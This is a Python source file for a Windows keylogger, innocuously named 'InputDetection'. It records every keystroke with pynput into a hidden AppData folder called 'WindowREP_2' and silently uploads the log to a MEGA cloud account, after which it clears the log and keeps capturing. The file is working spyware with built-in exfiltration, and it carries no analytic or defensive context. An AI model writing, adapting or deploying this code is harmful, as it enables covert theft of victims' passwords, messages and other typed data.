from pynput import keyboard
from datetime import datetime
import os
from mega import Mega

class InputDetection:

    def __init__(self):
        with open(os.path.expanduser("~")+"\\AppData\\local\\WindowREP_2\\stats.txt",'r') as file:
            name = file.read().strip()
        self.PATH = os.path.expanduser("~")+f"\\AppData\\local\\WindowREP_2\\{name}.txt"
        self.uploaded = False
        pass

    def print_date(self):
        with open(self.PATH, 'a') as file:
            time = datetime.now().strftime("[%D %H:%M:%S]--> ")
            file.write(time)

    def on_press(self, key):
        with open(self.PATH, 'a') as file:
            try:
                key_char = key.char
                if self.is_ctrl_unicode(key_char):
                    file.write(
                        "<Ctrl-"+self.character_from_ctrl_unicode(ord(key_char))+">")
                else:
                    file.write(key_char)
            except Exception as e:
                print(e)
                if key == keyboard.Key.space:
                    file.write(" ")
                elif key == keyboard.Key.enter:
                    file.write("\n")
                    time = datetime.now().strftime("[%D %H:%M:%S]--> ")
                    file.write(time)
                    if not self.uploaded:
                        self.try_upload()
                elif key == keyboard.Key.ctrl:
                    file.write("{ctrl}")

                elif key == keyboard.Key.backspace:
                    file.write("<backspace>")
    
    def refresh_file(self):
        with open(self.PATH,'w') as file:
            file.write("refreshed\n")
        self.print_date()
        
    def try_upload(self):
        try:
            mega = Mega()
            mega.login("Your MEGA EMAIL", "PASSWORD")
            file = self.PATH
            mega.upload(file)
            self.refresh_file()
            self.uploaded = True
        except:
            pass

    def run(self):
        self.print_date()
        self.try_upload()
        with keyboard.Listener(
            
                on_press=self.on_press) as listener:
            listener.join()
        listener = keyboard.Listener(
            on_press=self.on_press)
        listener.start()

    def is_ctrl_unicode(self, code: str) -> bool:
        yes = len(code) == 1 and 0 < ord(code) <= 26
        return yes

    def character_from_ctrl_unicode(self, order: int) -> str:
        if not 0 < order <= 26:
            return
        pool = "abcdefghijklmnopqrstuvwxyz"
        assert len(pool) == 26
        return pool[order-1]


if __name__ == "__main__":
    listener = InputDetection()
    listener.run()
